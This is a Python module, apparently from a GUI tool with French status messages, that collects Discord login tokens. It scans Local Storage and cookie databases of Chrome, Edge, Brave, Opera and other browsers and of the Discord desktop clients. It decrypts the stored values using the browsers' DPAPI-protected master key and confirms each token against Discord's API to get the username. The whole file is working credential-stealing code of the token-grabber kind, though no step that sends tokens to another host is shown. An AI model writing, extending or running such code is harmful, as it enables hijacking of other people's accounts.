import os
import re
import json
import shutil
import sqlite3
import base64
import tempfile
import threading
import requests
from pathlib import Path
from typing import List, Dict

try:
    import win32crypt
    HAS_WIN32 = True
except ImportError:
    HAS_WIN32 = False

try:
    from Crypto.Cipher import AES
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False

TOKEN_REGEX = re.compile(r"[\w-]{24,35}\.[\w-]{6}\.[\w-]{25,110}")
TOKEN_REGEX_ALT = re.compile(r"mfa\.[\w-]{84}")

LOCAL = os.getenv("LOCALAPPDATA", "")
ROAMING = os.getenv("APPDATA", "")

CHROMIUM_PATHS: Dict[str, str] = {
    "Chrome":    os.path.join(LOCAL,   "Google", "Chrome",       "User Data"),
    "Brave":     os.path.join(LOCAL,   "BraveSoftware", "Brave-Browser", "User Data"),
    "Edge":      os.path.join(LOCAL,   "Microsoft", "Edge",      "User Data"),
    "Opera":     os.path.join(ROAMING, "Opera Software", "Opera Stable"),
    "Opera GX":  os.path.join(ROAMING, "Opera Software", "Opera GX Stable"),
    "Vivaldi":   os.path.join(LOCAL,   "Vivaldi",        "User Data"),
    "Yandex":    os.path.join(LOCAL,   "Yandex",         "YandexBrowser", "User Data"),
    "Chromium":  os.path.join(LOCAL,   "Chromium",       "User Data"),
}

DISCORD_PATHS: Dict[str, str] = {
    "Discord":        os.path.join(ROAMING, "discord"),
    "Discord PTB":    os.path.join(ROAMING, "discordptb"),
    "Discord Canary": os.path.join(ROAMING, "discordcanary"),
    "Discord Dev":    os.path.join(ROAMING, "discorddevelopment"),
}

def check_token_validity(token: str) -> str | None:
    try:
        response = requests.get(
            "https://discord.com/api/v9/users/@me",
            headers={"Authorization": token, "Content-Type": "application/json"},
            timeout=5
        )
        if response.status_code == 200:
            data = response.json()
            username = data.get("username", "Inconnu")
            discriminator = data.get("discriminator", "0")
            if discriminator != "0":
                return f"{username}#{discriminator}"
            return username
    except Exception:
        pass
    return None

def _get_chrome_master_key(user_data_path: str) -> bytes | None:
    local_state_path = os.path.join(user_data_path, "Local State")
    if not os.path.exists(local_state_path):
        return None
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        if HAS_WIN32:
            return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception:
        pass
    return None

def _decrypt_chrome_token(encrypted_value: bytes, master_key: bytes | None) -> str | None:
    try:
        if encrypted_value[:3] == b"v10" and master_key and HAS_CRYPTO:
            iv = encrypted_value[3:15]
            payload = encrypted_value[15:-16]
            tag = encrypted_value[-16:]
            cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
            return cipher.decrypt_and_verify(payload, tag).decode("utf-8")
        elif HAS_WIN32:
            return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode("utf-8")
    except Exception:
        pass
    return None

def _scan_leveldb(path: str) -> List[str]:
    tokens = []
    if not os.path.isdir(path): return tokens
    for fname in os.listdir(path):
        if fname.endswith((".ldb", ".log")):
            try:
                with open(os.path.join(path, fname), "rb") as f:
                    content = f.read().decode("utf-8", errors="ignore")
                tokens.extend(TOKEN_REGEX.findall(content))
                tokens.extend(TOKEN_REGEX_ALT.findall(content))
            except Exception: pass
    return tokens

def _scan_chrome_profile(profile_path: str, master_key: bytes | None) -> List[str]:
    tokens = []
    ls_path = os.path.join(profile_path, "Local Storage", "leveldb")
    tokens.extend(_scan_leveldb(ls_path))
    
    cookies_db = os.path.join(profile_path, "Network", "Cookies")
    if not os.path.exists(cookies_db): cookies_db = os.path.join(profile_path, "Cookies")
    if os.path.exists(cookies_db):
        try:
            tmp = tempfile.mktemp(suffix=".db")
            shutil.copy2(cookies_db, tmp)
            conn = sqlite3.connect(tmp)
            cursor = conn.cursor()
            cursor.execute("SELECT encrypted_value FROM cookies WHERE host_key LIKE '%discord%' AND name='token'")
            for row in cursor.fetchall():
                dec = _decrypt_chrome_token(row[0], master_key)
                if dec: tokens.extend(TOKEN_REGEX.findall(dec))
            conn.close()
            os.remove(tmp)
        except Exception: pass
    return tokens

def scan_browsers(progress_callback=None) -> List[Dict]:
    results = []
    total = len(CHROMIUM_PATHS)
    for i, (name, user_data) in enumerate(CHROMIUM_PATHS.items()):
        if progress_callback: progress_callback(f"Scan {name}…", (i / total) * 0.45)
        if not os.path.isdir(user_data): continue
        master_key = _get_chrome_master_key(user_data)
        profiles = ["Default"] + [d for d in os.listdir(user_data) if d.startswith("Profile ") and os.path.isdir(os.path.join(user_data, d))]
        for profile in profiles:
            for token in set(_scan_chrome_profile(os.path.join(user_data, profile), master_key)):
                results.append({"token": token, "source": name, "profile": profile})
    return results

def _get_discord_master_key(discord_path: str) -> bytes | None:
    local_state_path = os.path.join(discord_path, "Local State")
    if not os.path.exists(local_state_path): return None
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        if HAS_WIN32: return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception: pass
    return None

def scan_discord_apps(progress_callback=None) -> List[Dict]:
    results = []
    total = len(DISCORD_PATHS)
    for i, (name, discord_dir) in enumerate(DISCORD_PATHS.items()):
        if progress_callback: progress_callback(f"Scan {name}…", 0.45 + (i / total) * 0.45)
        lvldb = os.path.join(discord_dir, "Local Storage", "leveldb")
        if not os.path.isdir(lvldb): continue
        master_key = _get_discord_master_key(discord_dir)
        
        found = set(_scan_leveldb(lvldb))
        if master_key and HAS_CRYPTO:
            for fname in os.listdir(lvldb):
                if not fname.endswith((".ldb", ".log")): continue
                try:
                    with open(os.path.join(lvldb, fname), "r", errors="ignore") as f:
                        for match in re.findall(r"dQw4w9WgXcQ:[^\"]*", f.read()):
                            dec = _decrypt_chrome_token(base64.b64decode(match.split("dQw4w9WgXcQ:")[1]), master_key)
                            if dec: found.add(dec)
                except Exception: pass
        for t in found: results.append({"token": t, "source": name, "profile": "App"})
    return results

def scan_all(progress_callback=None) -> List[Dict]:
    raw_results = []
    raw_results.extend(scan_browsers(progress_callback))
    raw_results.extend(scan_discord_apps(progress_callback))

    seen_tokens = set()
    unique_raw = []
    for r in raw_results:
        if r["token"] not in seen_tokens:
            seen_tokens.add(r["token"])
            unique_raw.append(r)

    if progress_callback: progress_callback("Validation des tokens…", 0.90)

    final_results = []
    lock = threading.Lock()

    def validate_task(item):
        username = check_token_validity(item["token"])
        if username:
            item["username"] = username
            with lock:
                final_results.append(item)

    threads = []
    for item in unique_raw:
        t = threading.Thread(target=validate_task, args=(item,))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    if progress_callback: progress_callback("Scan terminé !", 1.0)
    return final_results
